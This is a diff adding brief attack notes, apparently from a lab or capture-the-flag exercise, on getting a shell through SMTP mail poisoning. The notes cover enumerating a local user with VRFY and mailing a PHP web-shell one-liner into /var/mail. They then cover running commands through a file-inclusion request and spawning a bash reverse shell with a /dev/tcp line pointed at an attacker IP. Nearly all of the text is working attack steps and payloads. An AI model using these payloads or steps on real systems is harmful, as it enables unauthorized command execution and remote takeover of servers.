@@ -1,1 +1,25 @@
+Connect to SMTP (via telnet or netcat)
+EHLO <your username>
+			Can be anything
+VRFY asterisk@localhost
+		verify a local user account in this case asterisk
+	mail from:<the email address that you want the message to appear from>
+	rcpt to:<the recipients email address>
+	data
+	Subject:<your subject>
+	<the contents of your emails>
+	for a web shell type <?php echo system($_REQUEST['app']); ?> as the message contents
+	
+enter a blank line
+then end the email with .
+
+the mail will then be sent to /var/mail/asterisk
+Browse here with burp to read the file and execute requests via your php code
+in the GET request append &app=<linux command> to execute commands on the system
+Convert this to a POST request 
+	makes things easier
+Then use this to spawn a shell
+append &app=bash -i >& /dev/tcp/<your attacker ip address>/<lport> 0>&1
+be sure to url encode
+start listener and catch shell
 
